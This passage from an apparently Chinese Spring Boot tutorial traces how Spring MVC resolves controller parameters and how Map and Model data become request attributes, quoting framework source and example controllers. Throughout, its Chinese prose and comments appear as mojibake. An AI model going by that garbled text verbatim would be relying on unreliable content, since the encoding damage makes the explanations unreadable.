!paramType.isInstance(reader)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Request body reader is not of type [&quot;</span> + paramType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + reader);<br>&#125;<br><span class="hljs-keyword">return</span> reader;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Principal.class.isAssignableFrom(paramType)) &#123;<br><span class="hljs-type">Principal</span> <span class="hljs-variable">userPrincipal</span> <span class="hljs-operator">=</span> request.getUserPrincipal();<br><span class="hljs-keyword">if</span> (userPrincipal != <span class="hljs-literal">null</span> &amp;&amp; !paramType.isInstance(userPrincipal)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Current user principal is not of type [&quot;</span> + paramType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + userPrincipal);<br>&#125;<br><span class="hljs-keyword">return</span> userPrincipal;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (HttpMethod.class == paramType) &#123;<br><span class="hljs-keyword">return</span> HttpMethod.resolve(request.getMethod());<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Locale.class == paramType) &#123;<br><span class="hljs-keyword">return</span> RequestContextUtils.getLocale(request);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (TimeZone.class == paramType) &#123;<br><span class="hljs-type">TimeZone</span> <span class="hljs-variable">timeZone</span> <span class="hljs-operator">=</span> RequestContextUtils.getTimeZone(request);<br><span class="hljs-keyword">return</span> (timeZone != <span class="hljs-literal">null</span> ? timeZone : TimeZone.getDefault());<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ZoneId.class == paramType) &#123;<br><span class="hljs-type">TimeZone</span> <span class="hljs-variable">timeZone</span> <span class="hljs-operator">=</span> RequestContextUtils.getTimeZone(request);<br><span class="hljs-keyword">return</span> (timeZone != <span class="hljs-literal">null</span> ? timeZone.toZoneId() : ZoneId.systemDefault());<br>&#125;<br><br><span class="hljs-comment">// Should never happen...</span><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>(<span class="hljs-string">&quot;Unknown parameter type: &quot;</span> + paramType.getName());<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Inner class to avoid a hard dependency on Servlet API 4.0 at runtime.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PushBuilderDelegate</span> &#123;<br><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">resolvePushBuilder</span><span class="hljs-params">(HttpServletRequest request, Class&lt;?&gt; paramType)</span> &#123;<br><span class="hljs-type">PushBuilder</span> <span class="hljs-variable">pushBuilder</span> <span class="hljs-operator">=</span> request.newPushBuilder();<br><span class="hljs-keyword">if</span> (pushBuilder != <span class="hljs-literal">null</span> &amp;&amp; !paramType.isInstance(pushBuilder)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Current push builder is not of type [&quot;</span> + paramType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + pushBuilder);<br>&#125;<br><span class="hljs-keyword">return</span> pushBuilder;<br><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/goto&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">goToPage</span><span class="hljs-params">(HttpServletRequest request)</span>&#123;<br><br>        request.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;æˆåŠŸäº†...&quot;</span>);<br>        request.setAttribute(<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-number">200</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;forward:/success&quot;</span>;  <span class="hljs-comment">//è½¬å‘åˆ°  /successè¯·æ±‚</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="34ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-Modelã€MapåŸç†"><a href="#34ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-Modelã€MapåŸç†" class="headerlink" title="34ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-Modelã€MapåŸç†"></a>34ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-Modelã€MapåŸç†</h2><p>å¤æ‚å‚æ•°ï¼š</p><ul><li><p><strong>Map</strong></p></li><li><p><strong>Modelï¼ˆmapã€modelé‡Œé¢çš„æ•°æ®ä¼šè¢«æ”¾åœ¨requestçš„è¯·æ±‚åŸŸ  request.setAttributeï¼‰</strong></p></li><li><p>Errors&#x2F;BindingResult</p></li><li><p><strong>RedirectAttributesï¼ˆ é‡å®šå‘æºå¸¦æ•°æ®ï¼‰</strong></p></li><li><p><strong>ServletResponseï¼ˆresponseï¼‰</strong></p></li><li><p>SessionStatus</p></li><li><p>UriComponentsBuilder</p></li><li><p>ServletUriComponentsBuilder</p></li></ul><p>ç”¨ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/params&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">testParam</span><span class="hljs-params">(Map&lt;String,Object&gt; map,</span><br><span class="hljs-params">                        Model model,</span><br><span class="hljs-params">                        HttpServletRequest request,</span><br><span class="hljs-params">                        HttpServletResponse response)</span>&#123;<br>    <span class="hljs-comment">//ä¸‹é¢ä¸‰ä½éƒ½æ˜¯å¯ä»¥ç»™requeståŸŸä¸­æ”¾æ•°æ®</span><br>    map.put(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;world666&quot;</span>);<br>    model.addAttribute(<span class="hljs-string">&quot;world&quot;</span>,<span class="hljs-string">&quot;hello666&quot;</span>);<br>    request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>,<span class="hljs-string">&quot;HelloWorld&quot;</span>);<br><br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;c1&quot;</span>,<span class="hljs-string">&quot;v1&quot;</span>);<br>    response.addCookie(cookie);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;forward:/success&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-meta">@GetMapping(&quot;/success&quot;)</span><br><span class="hljs-keyword">public</span> Map <span class="hljs-title function_">success</span><span class="hljs-params">(<span class="hljs-meta">@RequestAttribute(value = &quot;msg&quot;,required = false)</span> String msg,</span><br><span class="hljs-params">                   <span class="hljs-meta">@RequestAttribute(value = &quot;code&quot;,required = false)</span>Integer code,</span><br><span class="hljs-params">                   HttpServletRequest request)</span>&#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">msg1</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;msg&quot;</span>);<br><br>    Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;hello&quot;</span>);<span class="hljs-comment">//å¾—å‡ºtestParamæ–¹æ³•èµ‹äºˆçš„å€¼ world666</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">world</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;world&quot;</span>);<span class="hljs-comment">//å¾—å‡ºtestParamæ–¹æ³•èµ‹äºˆçš„å€¼ hello666</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;message&quot;</span>);<span class="hljs-comment">//å¾—å‡ºtestParamæ–¹æ³•èµ‹äºˆçš„å€¼ HelloWorld</span><br><br>    map.put(<span class="hljs-string">&quot;reqMethod_msg&quot;</span>,msg1);<br>    map.put(<span class="hljs-string">&quot;annotation_msg&quot;</span>,msg);<br>    map.put(<span class="hljs-string">&quot;hello&quot;</span>,hello);<br>    map.put(<span class="hljs-string">&quot;world&quot;</span>,world);<br>    map.put(<span class="hljs-string">&quot;message&quot;</span>,message);<br><br>    <span class="hljs-keyword">return</span> map;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><code>Map&lt;String,Object&gt; map</code></p></li><li><p><code>Model model</code></p></li><li><p><code>HttpServletRequest request</code></p></li></ul><p>ä¸Šé¢ä¸‰ä½éƒ½æ˜¯å¯ä»¥ç»™requeståŸŸä¸­æ”¾æ•°æ®ï¼Œç”¨<code>request.getAttribute()</code>è·å–</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹ï¼Œ<code>Map&lt;String,Object&gt; map</code>ä¸<code>Model model</code>ç”¨ä»€ä¹ˆå‚æ•°å¤„ç†å™¨ã€‚</p><hr><p><code>Map&lt;String,Object&gt; map</code>å‚æ•°ç”¨<code>MapMethodProcessor</code>å¤„ç†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapMethodProcessor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span>, HandlerMethodReturnValueHandler &#123;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br><span class="hljs-keyword">return</span> (Map.class.isAssignableFrom(parameter.getParameterType()) &amp;&amp;<br>parameter.getParameterAnnotations().length == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>Assert.state(mavContainer != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;ModelAndViewContainer is required for model exposure&quot;</span>);<br><span class="hljs-keyword">return</span> mavContainer.getModel();<br>&#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>mavContainer.getModel()</code>å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModelAndViewContainer</span> &#123;<br><br>    ...<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ModelMap</span> <span class="hljs-variable">defaultModel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BindingAwareModelMap</span>();<br><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> ModelMap redirectModel;<br><br>    ...<br><br><span class="hljs-keyword">public</span> ModelMap <span class="hljs-title function_">getModel</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">if</span> (useDefaultModel()) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.defaultModel;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.redirectModel == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-built_in">this</span>.redirectModel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelMap</span>();<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.redirectModel;<br>&#125;<br>&#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">useDefaultModel</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> (!<span class="hljs-built_in">this</span>.redirectModelScenario || (<span class="hljs-built_in">this</span>.redirectModel == <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-built_in">this</span>.ignoreDefaultModelOnRedirect));<br>&#125;<br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><hr><p><code>Model model</code>ç”¨<code>ModelMethodProcessor</code>å¤„ç†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModelMethodProcessor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span>, HandlerMethodReturnValueHandler &#123;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br><span class="hljs-keyword">return</span> Model.class.isAssignableFrom(parameter.getParameterType());<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>Assert.state(mavContainer != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;ModelAndViewContainer is required for model exposure&quot;</span>);<br><span class="hljs-keyword">return</span> mavContainer.getModel();<br>&#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p><code>return mavContainer.getModel();</code>è¿™è·Ÿ<code>MapMethodProcessor</code>çš„ä¸€è‡´</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205010247689.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><code>Model</code>ä¹Ÿæ˜¯å¦ä¸€ç§æ„ä¹‰çš„<code>Map</code>ã€‚</p><hr><p><strong>æ¥ä¸‹æ¥çœ‹çœ‹</strong><code>Map&lt;String,Object&gt; map</code>ä¸<code>Model model</code>å€¼æ˜¯å¦‚ä½•åšåˆ°ç”¨<code>request.getAttribute()</code>è·å–çš„ã€‚</p><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œæ‰€æœ‰çš„æ•°æ®éƒ½æ”¾åœ¨ <strong>ModelAndView</strong>åŒ…å«è¦å»çš„é¡µé¢åœ°å€Viewï¼Œè¿˜åŒ…å«Modelæ•°æ®ã€‚</p><p>å…ˆçœ‹<strong>ModelAndView</strong>æ¥ä¸‹æ¥æ˜¯å¦‚ä½•å¤„ç†çš„ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>...<br><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <br>            ...<br><br><span class="hljs-comment">// Actually invoke the handler.</span><br>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br>            <br>            ...<br>            <br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>dispatchException = ex;<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable err) &#123;<br><span class="hljs-comment">// As of 4.3, we&#x27;re processing Errors thrown from handler methods as well,</span><br><span class="hljs-comment">// making them available for @ExceptionHandler methods and other scenarios.</span><br>dispatchException = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler dispatch failed&quot;</span>, err);<br>&#125;<br>        <span class="hljs-comment">//å¤„ç†åˆ†å‘ç»“æœ</span><br>processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);<br>&#125;<br>        ...<br><br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processDispatchResult</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> HandlerExecutionChain mappedHandler, <span class="hljs-meta">@Nullable</span> ModelAndView mv,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> Exception exception)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        ...<br><br><span class="hljs-comment">// Did the handler return a view to render?</span><br><span class="hljs-keyword">if</span> (mv != <span class="hljs-literal">null</span> &amp;&amp; !mv.wasCleared()) &#123;<br>render(mv, request, response);<br>...<br>&#125;<br>...<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">(ModelAndView mv, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>...<br><br>View view;<br><span class="hljs-type">String</span> <span class="hljs-variable">viewName</span> <span class="hljs-operator">=</span> mv.getViewName();<br><span class="hljs-keyword">if</span> (viewName != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">// We need to resolve the view name.</span><br>view = resolveViewName(viewName, mv.getModelInternal(), locale, request);<br><span class="hljs-keyword">if</span> (view == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(<span class="hljs-string">&quot;Could not resolve view with name &#x27;&quot;</span> + mv.getViewName() +<br><span class="hljs-string">&quot;&#x27; in servlet with name &#x27;&quot;</span> + getServletName() + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// No need to lookup: the ModelAndView object contains the actual View object.</span><br>view = mv.getView();<br><span class="hljs-keyword">if</span> (view == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(<span class="hljs-string">&quot;ModelAndView [&quot;</span> + mv + <span class="hljs-string">&quot;] neither contains a view name nor a &quot;</span> +<br><span class="hljs-string">&quot;View object in servlet with name &#x27;&quot;</span> + getServletName() + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>&#125;<br>&#125;<br>view.render(mv.getModelInternal(), request, response);<br>        <br>        ...<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨Debugæ¨¡å¼ä¸‹ï¼Œ<code>view</code>å±ä¸º<code>InternalResourceView</code>ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InternalResourceView</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractUrlBasedView</span> &#123;<br>    <br> <span class="hljs-meta">@Override</span><span class="hljs-comment">//è¯¥æ–¹æ³•åœ¨AbstractViewï¼ŒAbstractUrlBasedViewç»§æ‰¿äº†AbstractView</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Map&lt;String, ?&gt; model, HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        ...<br>        <br>Map&lt;String, Object&gt; mergedModel = createMergedOutputModel(model, request, response);<br>prepareResponse(request, response);<br>        <br>        <span class="hljs-comment">//çœ‹ä¸‹ä¸€ä¸ªæ–¹æ³•å®ç°</span><br>renderMergedOutputModel(mergedModel, getRequestToExpose(request), response);<br>&#125;<br>    <br>    <span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">renderMergedOutputModel</span><span class="hljs-params">(</span><br><span class="hljs-params">Map&lt;String, Object&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-comment">// Expose the model object as request attributes.</span><br>        <span class="hljs-comment">// æš´éœ²æ¨¡å‹ä½œä¸ºè¯·æ±‚åŸŸå±æ€§</span><br>exposeModelAsRequestAttributes(model, request);<span class="hljs-comment">//&lt;---é‡ç‚¹</span><br><br><span class="hljs-comment">// Expose helpers as request attributes, if any.</span><br>exposeHelpers(request);<br><br><span class="hljs-comment">// Determine the path for the request dispatcher.</span><br><span class="hljs-type">String</span> <span class="hljs-variable">dispatcherPath</span> <span class="hljs-operator">=</span> prepareForRendering(request, response);<br><br><span class="hljs-comment">// Obtain a RequestDispatcher for the target resource (typically a JSP).</span><br><span class="hljs-type">RequestDispatcher</span> <span class="hljs-variable">rd</span> <span class="hljs-operator">=</span> getRequestDispatcher(request, dispatcherPath);<br><br>        ...<br>&#125;<br>    <br>    <span class="hljs-comment">//è¯¥æ–¹æ³•åœ¨AbstractViewï¼ŒAbstractUrlBasedViewç»§æ‰¿äº†AbstractView</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exposeModelAsRequestAttributes</span><span class="hljs-params">(Map&lt;String, Object&gt; model,</span><br><span class="hljs-params">HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>model.forEach((name, value) -&gt; &#123;<br><span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span>) &#123;<br>request.setAttribute(name, value);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>request.removeAttribute(name);<br>&#125;<br>&#125;);<br>&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>exposeModelAsRequestAttributes</code>æ–¹æ³•çœ‹å‡ºï¼Œ<code>Map&lt;String,Object&gt; map</code>ï¼Œ<code>Model model</code>è¿™ä¸¤ç§ç±»å‹æ•°æ®å¯ä»¥ç»™requeståŸŸä¸­æ”¾æ•°æ®ï¼Œç”¨<code>request.getAttribute()</code>è·å–ã€‚</p><h2 id="35ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-è‡ªå®šä¹‰å‚æ•°ç»‘å®šåŸç†"><a href="#35ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-è‡ªå®šä¹‰å‚æ•°ç»‘å®šåŸç†" class="headerlink" title="35ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-è‡ªå®šä¹‰å‚æ•°ç»‘å®šåŸç†"></a>35ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-è‡ªå®šä¹‰å‚æ•°ç»‘å®šåŸç†</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span 